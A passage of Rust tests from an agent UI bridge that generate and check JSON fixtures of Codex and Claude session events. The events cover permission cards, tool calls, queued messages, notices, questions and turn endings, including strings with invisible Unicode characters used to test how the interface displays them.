    /// `agent-ui/web/src/fixtures/codex-cards.json`: what a Codex tab's permission cards, tool rows and
    /// limit-stopped turn look like on the wire -- the events payload this side sends and the snapshot it
    /// sends after folding the same events -- built from the provider's own card and tool-call
    /// constructors, which the panel's tests render. Compared on every run; `EITRI_WRITE_FIXTURES=1`
    /// rewrites it.
    #[test]
    fn the_codex_cards_fixture_is_what_the_serializer_sends() {
        use agent::providers::codex::approvals::{CardKind, FileChangeEntry, Wording};
        use agent::providers::codex::translate;
        use agent::providers::codex::wire::{ThreadItem, TurnError, TurnStatus};
        let card = |name: &str, kind: CardKind, subagent: Option<&str>| {
            let mut input = kind.input();
            if let (Some(label), Some(object)) = (subagent, input.as_object_mut()) {
                object.insert("subagent".into(), json!(label));
            }
            (
                name.to_string(),
                vec![AgentDomainEvent::PermissionRequested {
                    permission_id: format!("perm-{name}"),
                    tool_use_id: Some(format!("item-{name}")),
                    tool_name: kind.tool_name().to_string(),
                    input,
                    provider_prompt: None,
                }],
            )
        };
        let row = |item: serde_json::Value, subagent: Option<&str>| {
            let item: ThreadItem = serde_json::from_value(item).expect("a thread item");
            let (name, mut input) = translate::tool_start(&item).expect("a tool call");
            if let (Some(label), Some(object)) = (subagent, input.as_object_mut()) {
                object.insert("subagent".into(), json!(label));
            }
            let (content, is_error) = translate::tool_result(&item).expect("a result");
            let id = item.id().expect("an id").to_string();
            vec![
                AgentDomainEvent::ToolCallStarted {
                    turn_id: "t1".into(),
                    tool_use_id: id.clone(),
                    name: name.to_string(),
                    input,
                },
                AgentDomainEvent::ToolCallCompleted {
                    turn_id: "t1".into(),
                    tool_use_id: id,
                    content,
                    is_error,
                },
            ]
        };
        let entry = |path: &str, kind: &str, diff: &str, move_path: Option<&str>| FileChangeEntry {
            path: path.into(),
            kind: kind.into(),
            diff: diff.into(),
            move_path: move_path.map(str::to_string),
        };
        let (limit_outcome, limit_detail) = translate::turn_ending(
            &TurnStatus::Failed,
            Some(
                &serde_json::from_value::<TurnError>(json!({
                    "message": "You've hit your usage limit.",
                    "codexErrorInfo": "usageLimitExceeded",
                }))
                .unwrap(),
            ),
        );
        let cases: Vec<(String, Vec<AgentDomainEvent>)> = vec![
            card(
                "command",
                CardKind::Command {
                    command: Some("/bin/bash -lc 'git push origin main'".into()),
                    cwd: Some("/project".into()),
                    escalation: Wording::OutsideSandbox,
                    reason: Some("The push needs the network".into()),
                },
                None,
            ),
            card(
                "hidden",
                CardKind::Command {
                    command: Some("/bin/bash -lc 'echo \u{202e}dcba'".into()),
                    cwd: Some("/project".into()),
                    escalation: Wording::OutsideSandbox,
                    reason: None,
                },
                None,
            ),
            card(
                "network",
                CardKind::Command {
                    command: None,
                    cwd: None,
                    escalation: Wording::Network {
                        host: "registry.example.com".into(),
                        protocol: "https".into(),
                    },
                    reason: None,
                },
                None,
            ),
            card(
                "subagent",
                CardKind::Command {
                    command: Some("/bin/bash -lc 'cargo test'".into()),
                    cwd: Some("/project".into()),
                    escalation: Wording::OutsideSandbox,
                    reason: None,
                },
                Some("/root/tests"),
            ),
            card(
                "file_change",
                CardKind::FileChange {
                    changes: vec![
                        entry("/project/new.txt", "add", "one\ntwo\n", None),
                        entry(
                            "/project/src/lib.rs",
                            "update",
                            "@@ -1,2 +1,2 @@\n fn a() {}\n-fn b() {}\n+fn c() {}\n",
                            Some("/project/src/main.rs"),
                        ),
                    ],
                    reason: Some("Rename b to c".into()),
                },
                None,
            ),
            card(
                "mcp",
                CardKind::Mcp {
                    server: "docs".into(),
                    tool: "lookup".into(),
                    arguments: json!({"query": "tokio", "limit": 3}),
                },
                None,
            ),
            (
                "rows".to_string(),
                [
                    row(
                        json!({"type": "commandExecution", "id": "r1", "command": "/bin/bash -lc 'ls'", "cwd": "/project",
                               "status": "completed", "aggregatedOutput": "Cargo.toml\n", "exitCode": 0}),
                        None,
                    ),
                    row(
                        json!({"type": "commandExecution", "id": "r2", "command": "/bin/bash -lc 'cargo build'",
                               "cwd": "/project", "status": "completed", "aggregatedOutput": "ok\n", "exitCode": 0}),
                        Some("/root/builder"),
                    ),
                    row(
                        json!({"type": "fileChange", "id": "r3", "status": "completed", "changes": [
                            {"path": "/project/a.txt", "kind": {"type": "add"}, "diff": "hello\n"}]}),
                        None,
                    ),
                    row(
                        json!({"type": "mcpToolCall", "id": "r4", "server": "docs", "tool": "lookup", "status": "completed",
                               "arguments": {"query": "tokio"}, "result": {"content": []}}),
                        None,
                    ),
                    row(json!({"type": "webSearch", "id": "r5", "query": "tokio runtime"}), None),
                    row(
                        json!({"type": "collabAgentToolCall", "id": "r6", "tool": "spawnAgent", "status": "completed",
                               "receiverThreadIds": ["th-2"], "prompt": "Run the tests"}),
                        None,
                    ),
                ]
                .concat(),
            ),
            (
                "usage_limit".to_string(),
                vec![
                    AgentDomainEvent::AccountLimits {
                        used_percent: 100.0,
                        window_minutes: Some(300),
                        resets_at: Some(1_790_000_000),
                        plan: Some("pro".into()),
                    },
                    AgentDomainEvent::TurnCompleted {
                        turn_id: "t1".into(),
                        outcome: limit_outcome,
                        result_text: String::new(),
                        stop_reason: None,
                        usage: None,
                        detail: limit_detail,
                    },
                ],
            ),
        ];

        let mut written_cases = Vec::new();
        for (name, tail) in cases {
            let mut events = vec![
                AgentDomainEvent::SessionOpened {
                    session_id: "sess-1".into(),
                    provider_session_id: "prov-1".into(),
                    model: "gpt-5-codex".into(),
                    cwd: "/project".into(),
                },
                AgentDomainEvent::TurnStarted { turn_id: "t1".into() },
                AgentDomainEvent::UserPromptSubmitted {
                    text: "fix the parser".into(),
                },
            ];
            events.extend(tail);
            let mut projection = AgentSessionProjection::default();
            for event in &events {
                projection.apply(event);
            }
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: Some("sess-1"),
                provider_session_id: Some("prov-1".into()),
                capabilities: agent::ProviderCapabilities {
                    resume: true,
                    fork: false,
                    interrupt: true,
                    bypass_permission_mode: true,
                    interactive_permission_mode: true,
                    cli_auto_mode: false,
                    steer: false,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                hidden_pending: None,
            };
            let events_payload = serialize_events_for_js(TabId(1), 0, projection.last_revision, &events);
            let snapshot_payload = serialize_snapshot_for_js(TabId(1), &view, None);
            written_cases.push(json!({
                "name": name,
                "events": serde_json::from_str::<Value>(&events_payload).unwrap(),
                "snapshot": serde_json::from_str::<Value>(&snapshot_payload).unwrap(),
            }));
        }
        let fixture = json!({
            "writtenBy": "core/src/agent_bridge.rs, tests::the_codex_cards_fixture_is_what_the_serializer_sends \
                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
            "cases": written_cases,
        });
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/codex-cards.json");
        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
        let committed = std::fs::read_to_string(&path).ok();
        if committed.as_deref() == Some(written.as_str()) {
            return;
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(&path, &written).expect("write the codex cards fixture");
        } else {
            assert_eq!(
                committed.as_deref(),
                Some(written.as_str()),
                "the committed codex cards fixture is not what this test produces; if the change is \
                 intended, regenerate it with EITRI_WRITE_FIXTURES=1"
            );
        }
    }

    /// `agent-ui/web/src/fixtures/steered-messages.json`: a Codex turn into which one message went and was
    /// read (a user prompt where the agent read it) and another was dropped (nothing in the conversation),
    /// as the events this side sends and the snapshot of the same projection, and the queue envelopes the
    /// lines above the box are drawn from. The panel's tests fold the events with its own reducer and must
    /// arrive at the snapshot. Compared on every run; `EITRI_WRITE_FIXTURES=1` rewrites it.
    #[test]
    fn the_steered_messages_fixture_is_what_the_serializer_sends() {
        use crate::tab_set::{Queued, QueuedState};
        let events = vec![
            AgentDomainEvent::SessionOpened {
                session_id: "codex-1".into(),
                provider_session_id: "thread-1".into(),
                model: "gpt-test".into(),
                cwd: "/project".into(),
            },
            AgentDomainEvent::TurnStarted { turn_id: "t1".into() },
            AgentDomainEvent::UserPromptSubmitted {
                text: "fix the parser".into(),
            },
            AgentDomainEvent::ContentDelta {
                turn_id: "t1".into(),
                kind: agent::ContentKind::Text,
                text: "Looking at the parser.".into(),
            },
            AgentDomainEvent::ToolCallStarted {
                turn_id: "t1".into(),
                tool_use_id: "item-1".into(),
                name: "commandExecution".into(),
                input: json!({ "command": "cargo test -p parser" }),
            },
            AgentDomainEvent::ToolCallCompleted {
                turn_id: "t1".into(),
                tool_use_id: "item-1".into(),
                content: json!("ok"),
                is_error: false,
            },
            AgentDomainEvent::UserMessageDelivered {
                client_message_id: "eitri-1-1".into(),
                turn_id: "t1".into(),
                text: "and the tests".into(),
            },
            AgentDomainEvent::ContentDelta {
                turn_id: "t1".into(),
                kind: agent::ContentKind::Text,
                text: "Adding tests too.".into(),
            },
            AgentDomainEvent::UserMessageDropped {
                client_message_id: "eitri-1-2".into(),
                reason: "the turn ended before Codex read it".into(),
            },
            AgentDomainEvent::TurnCompleted {
                turn_id: "t1".into(),
                outcome: agent::TurnOutcome::Completed,
                result_text: "Adding tests too.".into(),
                stop_reason: None,
                usage: None,
                detail: Default::default(),
            },
        ];
        let mut projection = AgentSessionProjection::default();
        for event in &events {
            projection.apply(event);
        }
        let view = SnapshotView {
            backend: "external",
            conversation_id: None,
            session_id: Some("codex-1"),
            provider_session_id: Some("thread-1".into()),
            capabilities: agent::ProviderCapabilities {
                interrupt: true,
                steer: true,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let events_payload = serialize_events_for_js(TabId(1), 0, projection.last_revision, &events);
        let snapshot_payload = serialize_snapshot_for_js(TabId(1), &view, None);
        let mut steered = Queued::held("look at the lexer too", "ctx\n\nlook at the lexer too".into(), 20);
        steered.state = QueuedState::Steered {
            client_id: "eitri-1-3".into(),
            sent_at_ms: 21,
        };
        let running_queue = serialize_queue_for_js(
            TabId(1),
            &[steered, Queued::held("then commit", "ctx\n\nthen commit".into(), 22)],
            None,
            Some("held until the turn ends: the turn ended before Codex read it"),
            Some(true),
        );
        let fixture = json!({
            "writtenBy": "core/src/agent_bridge.rs, tests::the_steered_messages_fixture_is_what_the_serializer_sends \
                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
            "events": serde_json::from_str::<Value>(&events_payload).unwrap(),
            "snapshot": serde_json::from_str::<Value>(&snapshot_payload).unwrap(),
            "queue": serde_json::from_str::<Value>(&running_queue).unwrap(),
        });
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/steered-messages.json");
        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
        let committed = std::fs::read_to_string(&path).ok();
        if committed.as_deref() == Some(written.as_str()) {
            return;
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(&path, &written).expect("write the steered messages fixture");
        } else {
            assert_eq!(
                committed.as_deref(),
                Some(written.as_str()),
                "the committed steered messages fixture is not what this test produces; if the change is \
                 intended, regenerate it with EITRI_WRITE_FIXTURES=1"
            );
        }
    }

    /// `agent-ui/web/src/fixtures/changed-input.json`: a call whose CLI prompt carried another input
    /// than the gate saw, as the events payload this side sends and the snapshot after folding the
    /// same events, which the panel's tests fold and render. Compared on every run;
    /// `EITRI_WRITE_FIXTURES=1` rewrites it.
    #[test]
    fn the_changed_input_fixture_is_what_the_serializer_sends() {
        let ask = |permission_id: &str, input: Value, from_cli: bool| AgentDomainEvent::PermissionRequested {
            permission_id: permission_id.into(),
            tool_use_id: Some("toolu_1".into()),
            tool_name: "Bash".into(),
            input,
            provider_prompt: from_cli.then(agent::ProviderPrompt::default),
        };
        let events = vec![
            AgentDomainEvent::SessionOpened {
                session_id: "sess-1".into(),
                provider_session_id: "prov-1".into(),
                model: "claude-sonnet-5".into(),
                cwd: "/project".into(),
            },
            AgentDomainEvent::TurnStarted { turn_id: "t1".into() },
            AgentDomainEvent::ToolCallStarted {
                turn_id: "t1".into(),
                tool_use_id: "toolu_1".into(),
                name: "Bash".into(),
                input: json!({ "command": "git push --force origin main" }),
            },
            ask("g1", json!({ "command": "git push --force origin main" }), false),
            AgentDomainEvent::PermissionResolved {
                permission_id: "g1".into(),
                outcome: agent::PermissionOutcome::Allowed,
            },
            // A hook rewrote the command, and a character the eye cannot see went in with it.
            ask(
                "c1",
                json!({ "command": "rtk git push --force origin main\u{202e}" }),
                true,
            ),
        ];
        // What ingestion does: fold each event, then the one the projection derives from it. And what
        // the host does before the page sees any of it: the gate request was answered without a card
        // (a deferral in an Auto tab), so it and its resolution never reach the page -- the page gets
        // the derived `tool_input_changed` and nothing to compare.
        let mut projection = AgentSessionProjection::default();
        let mut delivered = Vec::new();
        for event in events {
            let derived = projection.apply_with_derived(&event);
            let answered_by_the_host = matches!(&event, AgentDomainEvent::PermissionRequested { permission_id, .. } if permission_id == "g1")
                || matches!(&event, AgentDomainEvent::PermissionResolved { permission_id, .. } if permission_id == "g1");
            if !answered_by_the_host {
                delivered.push(event);
            }
            delivered.extend(derived);
        }
        let events = delivered;
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: Some("sess-1"),
            provider_session_id: Some("prov-1".into()),
            capabilities: agent::ProviderCapabilities {
                resume: true,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let events_payload = serialize_events_for_js(TabId(1), 0, projection.last_revision, &events);
        let snapshot_payload = serialize_snapshot_for_js(TabId(1), &view, None);
        let fixture = json!({
            "writtenBy": "core/src/agent_bridge.rs, tests::the_changed_input_fixture_is_what_the_serializer_sends \
                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
            "events": serde_json::from_str::<Value>(&events_payload).unwrap(),
            "snapshot": serde_json::from_str::<Value>(&snapshot_payload).unwrap(),
        });
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/changed-input.json");
        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
        let committed = std::fs::read_to_string(&path).ok();
        if committed.as_deref() == Some(written.as_str()) {
            return;
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(&path, &written).expect("write the changed input fixture");
        } else {
            assert_eq!(
                committed.as_deref(),
                Some(written.as_str()),
                "the committed changed input fixture is not what this test produces; if the change is \
                 intended, regenerate it with EITRI_WRITE_FIXTURES=1"
            );
        }
    }

    /// `agent-ui/web/src/fixtures/history-records.json`: turns the CLI started with every kind of
    /// cause (and one of each other origin), one notice of every kind, and question sets left waiting
    /// and settled each way, as the events this side sends, the snapshot taken partway (a question
    /// still waiting in it) and the snapshot after them all. The panel's tests fold the events with
    /// its own reducer, from the start and from the middle snapshot, and must arrive at the last
    /// snapshot. Compared on every run; `EITRI_WRITE_FIXTURES=1` rewrites it.
    #[test]
    fn the_history_records_fixture_is_what_the_serializer_sends() {
        use agent::{
            NoticeLevel, QuestionOptionSpec, QuestionOutcome, QuestionSpec, SessionNoticeKind, ShownAnswer, TurnCause,
            TurnCauseKind, TurnOrigin,
        };
        let completed = |turn_id: &str| AgentDomainEvent::TurnCompleted {
            turn_id: turn_id.into(),
            outcome: agent::TurnOutcome::Completed,
            result_text: String::new(),
            stop_reason: None,
            usage: None,
            detail: Default::default(),
        };
        let cause = |kind: TurnCauseKind| {
            let mut cause = TurnCause::of_kind(kind);
            match kind {
                TurnCauseKind::Task => {
                    cause.task_id = Some("task-1".into());
                    cause.tool_use_id = Some("tool-1".into());
                    cause.task_kind = Some("shell".into());
                    cause.task_status = Some("completed".into());
                    cause.description = Some("cargo build --release".into());
                    cause.summary = Some("Background command \"cargo build\" completed (exit code 0)".into());
                }
                TurnCauseKind::Scheduled => {
                    cause.wakeup_source = Some("loop_wakeup".into());
                    cause.scheduled_for_ms = Some(1_790_000_000_000);
                    cause.schedule_reason = Some("check the deploy".into());
                    cause.cron_id = Some("cron-3".into());
                    cause.prompt = Some("Is the deploy green?".into());
                }
                TurnCauseKind::Peer => {
                    cause.peer_name = Some("reviewer".into());
                    cause.text = Some("Look at \u{202e}line 4\u{200b} please".into());
                }
                TurnCauseKind::Other => cause.text = Some("coordinator".into()),
                TurnCauseKind::Unknown => {}
            }
            cause
        };
        let mut events = vec![AgentDomainEvent::SessionOpened {
            session_id: "sess-1".into(),
            provider_session_id: "prov-1".into(),
            model: "claude-sonnet-5".into(),
            cwd: "/project".into(),
        }];
        // A turn the user sent, attributed as theirs: no row.
        events.push(AgentDomainEvent::UserPromptSubmitted { text: "start".into() });
        events.push(AgentDomainEvent::TurnStarted { turn_id: "t1".into() });
        events.push(AgentDomainEvent::TurnAttributed {
            turn_id: "t1".into(),
            origin: TurnOrigin::Client,
            cause: None,
        });
        events.push(completed("t1"));
        let kinds = [
            TurnCauseKind::Task,
            TurnCauseKind::Scheduled,
            TurnCauseKind::Peer,
            TurnCauseKind::Other,
            TurnCauseKind::Unknown,
        ];
        for (n, kind) in kinds.into_iter().enumerate() {
            let turn = format!("cli-{n}");
            events.push(AgentDomainEvent::TurnStarted { turn_id: turn.clone() });
            events.push(AgentDomainEvent::TurnAttributed {
                turn_id: turn.clone(),
                origin: TurnOrigin::Cli,
                cause: Some(cause(kind)),
            });
            events.push(AgentDomainEvent::ContentDelta {
                turn_id: turn.clone(),
                kind: agent::ContentKind::Text,
                text: format!("Reply {n}."),
            });
            events.push(completed(&turn));
        }
        // A follow-up turn, which names no cause.
        events.push(AgentDomainEvent::TurnStarted {
            turn_id: "follow-1".into(),
        });
        events.push(AgentDomainEvent::TurnAttributed {
            turn_id: "follow-1".into(),
            origin: TurnOrigin::FollowUp,
            cause: None,
        });
        events.push(completed("follow-1"));
        let notice =
            |kind: SessionNoticeKind, level: NoticeLevel, content: Option<&str>| AgentDomainEvent::SessionNotice {
                kind,
                level,
                content: content.map(str::to_string),
                scalars: Default::default(),
                task_id: None,
                tool_use_id: None,
                task_status: None,
            };
        events.push(AgentDomainEvent::SessionNotice {
            kind: SessionNoticeKind::Task,
            level: NoticeLevel::Notice,
            content: Some("Background command \"cargo build\" completed (exit code 0)".into()),
            scalars: [("exit_code".to_string(), json!(0))].into_iter().collect(),
            task_id: Some("task-1".into()),
            tool_use_id: Some("toolu_bg".into()),
            task_status: Some("completed".into()),
        });
        events.push(notice(
            SessionNoticeKind::ModelFallback,
            NoticeLevel::Warning,
            Some("Switched to claude-sonnet-5"),
        ));
        events.push(notice(
            SessionNoticeKind::ModelRefusal,
            NoticeLevel::Warning,
            Some("The model refused"),
        ));
        // No words: worded from its figures.
        events.push(AgentDomainEvent::SessionNotice {
            kind: SessionNoticeKind::Compaction,
            level: NoticeLevel::Info,
            content: None,
            scalars: [
                ("pre_tokens".to_string(), json!(182_000)),
                ("post_tokens".to_string(), json!(41_000)),
                ("trigger".to_string(), json!("auto")),
            ]
            .into_iter()
            .collect(),
            task_id: None,
            tool_use_id: None,
            task_status: None,
        });
        events.push(notice(
            SessionNoticeKind::Informational,
            NoticeLevel::Suggestion,
            Some("Try /compact"),
        ));
        events.push(notice(
            SessionNoticeKind::HookBlock,
            NoticeLevel::Warning,
            Some("blocked by policy"),
        ));
        events.push(AgentDomainEvent::SessionNotice {
            kind: SessionNoticeKind::PeerHold,
            level: NoticeLevel::Warning,
            content: None,
            scalars: [
                ("peer_name".to_string(), json!("reviewer")),
                ("hold_state".to_string(), json!("held")),
            ]
            .into_iter()
            .collect(),
            task_id: None,
            tool_use_id: None,
            task_status: None,
        });
        events.push(notice(
            SessionNoticeKind::RateLimit,
            NoticeLevel::Notice,
            Some("Usage limit reset"),
        ));
        events.push(notice(SessionNoticeKind::UnseenTurn, NoticeLevel::Notice, None));
        let questions = |text: &str, multi: bool| {
            vec![QuestionSpec {
                question: text.into(),
                header: "Target".into(),
                multi_select: multi,
                options: vec![
                    QuestionOptionSpec {
                        label: "\"debug\"".into(),
                        description: "fast to build".into(),
                        preview: None,
                    },
                    QuestionOptionSpec {
                        label: "release\u{200b}".into(),
                        description: "slow to build".into(),
                        preview: Some("```\ncargo build --release\n```".into()),
                    },
                ],
            }]
        };
        events.push(AgentDomainEvent::TurnStarted { turn_id: "t2".into() });
        events.push(AgentDomainEvent::QuestionAsked {
            interaction_id: "q-answered".into(),
            tool_use_id: Some("toolu_q1".into()),
            questions: questions("Which build?", false),
            unsupported_reason: None,
        });
        events.push(AgentDomainEvent::QuestionAsked {
            interaction_id: "q-waiting".into(),
            tool_use_id: Some("toolu_q2".into()),
            questions: questions("Which targets?", true),
            unsupported_reason: None,
        });
        // The middle snapshot is taken here: both questions wait in it.
        let split = events.len();
        events.push(AgentDomainEvent::QuestionSettled {
            interaction_id: "q-answered".into(),
            outcome: QuestionOutcome::Answered,
            answers: vec![ShownAnswer {
                question_index: 0,
                answer: "release\u{200b}".into(),
                notes: Some("ship it".into()),
            }],
            reason: None,
        });
        // A second settlement for the same id changes nothing.
        events.push(AgentDomainEvent::QuestionSettled {
            interaction_id: "q-answered".into(),
            outcome: QuestionOutcome::Expired,
            answers: vec![],
            reason: None,
        });
        events.push(AgentDomainEvent::QuestionAsked {
            interaction_id: "q-refused".into(),
            tool_use_id: None,
            questions: vec![],
            unsupported_reason: Some("five options in one question".into()),
        });
        events.push(AgentDomainEvent::QuestionSettled {
            interaction_id: "q-refused".into(),
            outcome: QuestionOutcome::HostRefused,
            answers: vec![],
            reason: Some("five options in one question".into()),
        });
        for (id, outcome) in [
            ("q-declined", QuestionOutcome::Declined),
            ("q-chat", QuestionOutcome::ChatRequested),
            ("q-interrupted", QuestionOutcome::Interrupted),
            ("q-expired", QuestionOutcome::Expired),
            ("q-closed", QuestionOutcome::SessionClosed),
            ("q-failed", QuestionOutcome::ProviderFailed),
        ] {
            events.push(AgentDomainEvent::QuestionAsked {
                interaction_id: id.into(),
                tool_use_id: Some(format!("toolu_{id}")),
                questions: questions("Go on?", false),
                unsupported_reason: None,
            });
            events.push(AgentDomainEvent::QuestionSettled {
                interaction_id: id.into(),
                outcome,
                answers: vec![],
                reason: (outcome == QuestionOutcome::ProviderFailed).then(|| "the sidecar exited".into()),
            });
        }
        events.push(completed("t2"));
        // Asked between turns and left waiting.
        events.push(AgentDomainEvent::QuestionAsked {
            interaction_id: "q-last".into(),
            tool_use_id: Some("toolu_last".into()),
            questions: questions("Still there?", false),
            unsupported_reason: None,
        });

        let view_of = |projection: &AgentSessionProjection| {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: Some("sess-1"),
                provider_session_id: Some("prov-1".into()),
                capabilities: agent::ProviderCapabilities {
                    interrupt: true,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            serde_json::from_str::<Value>(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap()
        };
        let mut projection = AgentSessionProjection::default();
        let mut middle = Value::Null;
        for (at, event) in events.iter().enumerate() {
            if at == split {
                middle = view_of(&projection);
            }
            projection.apply(event);
        }
        assert_eq!(
            projection.turn_starts.len(),
            6,
            "five causes and the follow-up; the user's turn has none"
        );
        assert_eq!(projection.notices.len(), 9, "one notice of every kind");
        assert!(matches!(
            projection.questions[0].state,
            agent::QuestionState::Settled {
                outcome: QuestionOutcome::Answered,
                ..
            }
        ));
        assert_eq!(projection.questions[0].turn_id.as_deref(), Some("t2"));
        assert_eq!(projection.questions.last().unwrap().turn_id, None);
        let events_payload = serialize_events_for_js(TabId(1), 0, projection.last_revision, &events);
        let fixture = json!({
            "writtenBy": "core/src/agent_bridge.rs, tests::the_history_records_fixture_is_what_the_serializer_sends \
                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
            "split": split,
            "events": serde_json::from_str::<Value>(&events_payload).unwrap(),
            "middle": middle,
            "snapshot": view_of(&projection),
        });
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/history-records.json");
        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
        let committed = std::fs::read_to_string(&path).ok();
        if committed.as_deref() == Some(written.as_str()) {
            return;
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(&path, &written).expect("write the history records fixture");
        } else {
            assert_eq!(
                committed.as_deref(),
                Some(written.as_str()),
                "the committed history records fixture is not what this test produces; if the change is \
                 intended, regenerate it with EITRI_WRITE_FIXTURES=1"
            );
        }
    }

    /// A conversation with none of the three collections sends none of their keys, so every snapshot
    /// written before they existed is still what this side sends for such a conversation.
    #[test]
    fn a_snapshot_without_turn_starts_notices_or_questions_sends_none_of_their_keys() {
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::TurnStarted { turn_id: "t1".into() });
        projection.apply(&AgentDomainEvent::TurnAttributed {
            turn_id: "t1".into(),
            origin: agent::TurnOrigin::Client,
            cause: None,
        });
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities::default(),
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        for key in ["turnStarts", "notices", "questions", "cliUnseenBusy"] {
            assert!(
                parsed["state"].get(key).is_none(),
                "{key} sent for a conversation with none"
            );
        }
    }

    /// `agent-ui/web/src/fixtures/unseen-turns.json`: what a turn's end does in every combination of
    /// a turn running or not, result text or not, and its own turn or another; a prompt a hook
    /// stopped and a slash command that answered without a reply; the note of work out of sight and
    /// its end; and a prompt taken back. Each case is the events this side delivers (the ones the
    /// projection derives included, as ingestion delivers them) and the snapshot after them, which
    /// the panel's tests fold and load and must find equal. Compared on every run;
    /// `EITRI_WRITE_FIXTURES=1` rewrites it.
    #[test]
    fn the_unseen_turns_fixture_is_what_the_serializer_sends() {
        use agent::{ContentKind, SessionNoticeKind, TurnOutcome};
        let opened = AgentDomainEvent::SessionOpened {
            session_id: "sess-1".into(),
            provider_session_id: "prov-1".into(),
            model: "claude-sonnet-5".into(),
            cwd: "/project".into(),
        };
        let prompt = |text: &str| AgentDomainEvent::UserPromptSubmitted { text: text.into() };
        let started = |turn: &str| AgentDomainEvent::TurnStarted { turn_id: turn.into() };
        let text = |turn: &str, text: &str| AgentDomainEvent::ContentDelta {
            turn_id: turn.into(),
            kind: ContentKind::Text,
            text: text.into(),
        };
        let ended = |turn: &str, outcome: TurnOutcome, result_text: &str| AgentDomainEvent::TurnCompleted {
            turn_id: turn.into(),
            outcome,
            result_text: result_text.into(),
            stop_reason: None,
            usage: None,
            detail: Default::default(),
        };
        // A turn of the user's own that is still running, and one that has ended.
        let running = vec![
            opened.clone(),
            prompt("fix the parser"),
            started("t1"),
            text("t1", "Looking at it"),
        ];
        let mut finished = running.clone();
        finished.push(ended("t1", TurnOutcome::Completed, "Looking at it"));
        let with = |base: &[AgentDomainEvent], more: Vec<AgentDomainEvent>| {
            let mut events = base.to_vec();
            events.extend(more);
            events
        };
        let cases: Vec<(&str, Vec<AgentDomainEvent>)> = vec![
            (
                "foreign_while_running_with_text",
                with(
                    &running,
                    vec![
                        ended(
                            "unknown-turn",
                            TurnOutcome::Completed,
                            "The tests passed in the background.",
                        ),
                        text("t1", " and the fix is in"),
                    ],
                ),
            ),
            (
                "foreign_while_running_without_text",
                with(&running, vec![ended("unknown-turn", TurnOutcome::Failed, "")]),
            ),
            (
                "foreign_none_running_with_text",
                with(
                    &finished,
                    vec![ended("unknown-turn", TurnOutcome::Failed, "The build is green.")],
                ),
            ),
            (
                "foreign_none_running_without_text",
                with(&finished, vec![ended("unknown-turn", TurnOutcome::Failed, "")]),
            ),
            ("own_turn_with_text", finished.clone()),
            (
                "own_turn_without_text",
                with(&running, vec![ended("t1", TurnOutcome::Completed, "")]),
            ),
            (
                "own_turn_failed_with_text",
                with(&running, vec![ended("t1", TurnOutcome::Failed, "API Error: 500")]),
            ),
            (
                "hook_blocked_prompt",
                vec![
                    opened.clone(),
                    prompt("deploy to production"),
                    started("t1"),
                    ended(
                        "t1",
                        TurnOutcome::Completed,
                        "Blocked by the deploy guard: production deploys need a ticket\u{202e}.",
                    ),
                ],
            ),
            (
                "compact_answers_without_a_reply",
                vec![
                    opened.clone(),
                    prompt("/compact"),
                    started("t1"),
                    ended("t1", TurnOutcome::Completed, "Compacted. ctrl+o to see full summary"),
                ],
            ),
            (
                "cli_work_unseen",
                with(&finished, vec![AgentDomainEvent::CliWorkUnseen]),
            ),
            (
                "cli_work_unseen_then_its_end",
                with(
                    &finished,
                    vec![
                        AgentDomainEvent::CliWorkUnseen,
                        ended("unknown-turn", TurnOutcome::Completed, ""),
                    ],
                ),
            ),
            (
                "cli_work_unseen_then_the_session_closes",
                with(
                    &finished,
                    vec![
                        AgentDomainEvent::CliWorkUnseen,
                        AgentDomainEvent::SessionClosed {
                            reason: "closed".into(),
                        },
                    ],
                ),
            ),
            (
                "cli_work_unseen_then_the_session_is_lost",
                with(
                    &finished,
                    vec![
                        AgentDomainEvent::CliWorkUnseen,
                        AgentDomainEvent::SessionUnavailable {
                            reason: "the sidecar exited".into(),
                        },
                    ],
                ),
            ),
            (
                "cli_work_unseen_then_a_resume_that_did_not_attach",
                with(
                    &finished,
                    vec![
                        AgentDomainEvent::CliWorkUnseen,
